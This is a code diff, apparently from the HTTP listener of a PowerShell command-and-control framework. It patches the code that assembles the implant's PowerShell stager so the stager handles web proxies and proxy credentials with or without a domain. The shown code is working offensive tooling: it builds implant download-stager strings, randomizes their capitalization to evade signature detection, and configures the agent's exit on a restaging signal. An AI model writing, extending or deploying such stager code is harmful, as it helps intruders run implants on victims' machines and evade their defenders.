@@ -249,8 +249,7 @@ class Listener:
                             stager += helpers.randomize_capitalization("$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
                         else:
                             # TODO: implement form for other proxy
-                            stager += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy;")
-                            stager += helpers.randomize_capitalization("$proxy.Address = '"+ proxy.lower() +"';")
+                            stager += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy('"+ proxy.lower() +"');")
                             stager += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
                         if proxyCreds.lower() == "default":
                             stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
@@ -258,9 +257,13 @@ class Listener:
                             # TODO: implement form for other proxy credentials
                             username = proxyCreds.split(':')[0]
                             password = proxyCreds.split(':')[1]
-                            domain = username.split('\\')[0]
-                            usr = username.split('\\')[1]
-                            stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
+                            if len(username.split('\\')) > 1:
+                                usr = username.split('\\')[1]
+                                domain = username.split('\\')[0]
+                                stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
+                            else:
+                                usr = username.split('\\')[0]
+                                stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"');"
                             stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
 
                         #save the proxy settings to use during the entire staging process and the agent
@@ -766,7 +769,7 @@ def send_message(packets=None):
         #if signaled for restaging, exit.
         if HTTPError.code == 401:
             sys.exit(0)
-        
+
         return (HTTPError.code, '')
 
     except urllib2.URLError as URLerror:
